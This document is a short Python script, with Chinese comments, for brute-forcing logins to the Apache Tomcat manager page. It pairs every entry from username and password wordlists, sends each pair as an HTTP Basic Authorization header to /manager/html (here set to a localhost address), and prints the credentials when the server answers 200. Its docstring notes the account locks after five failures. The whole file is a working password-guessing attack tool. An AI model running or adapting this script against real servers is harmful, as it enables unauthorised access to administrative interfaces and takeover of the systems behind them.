"""
tomcat密码爆破工具
然而测试中发现错误5次就会锁定账户...

"""
import requests
import base64

user_dict = "user.txt"
pass_dict = "pass.txt"


def get_palyload():
    userlist = [line.rstrip() for line in open(user_dict)]
    passlist = [line.rstrip() for line in open(pass_dict)]
    user_len = len(userlist)
    pass_len = len(passlist)
    brute_dict = []
    for i in range(user_len):
        for j in range(pass_len):
            brute_dict.append("%s:%s" % (userlist[i], passlist[j]))

    return brute_dict


def brute():
    brute_dict = get_palyload()
    global i
    i = 1
    for auth in brute_dict:
        print("第%d次尝试：" % i, auth)
        i += 1
        palyload = 'Basic ' + base64.b64encode(auth.encode(encoding='utf-8')).decode()
        # print(palyload)
        target_url = "http://127.0.0.1:8080/manager/html"
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36',
                   'Authorization': palyload
                   }
        r = requests.get(target_url, headers=headers)
        print(r.status_code)
        if (r.status_code == 200):
            print("破解密码：", auth)
            break
    # print("没有匹配")


def main():
    brute()
if __name__ == '__main__':
    main()
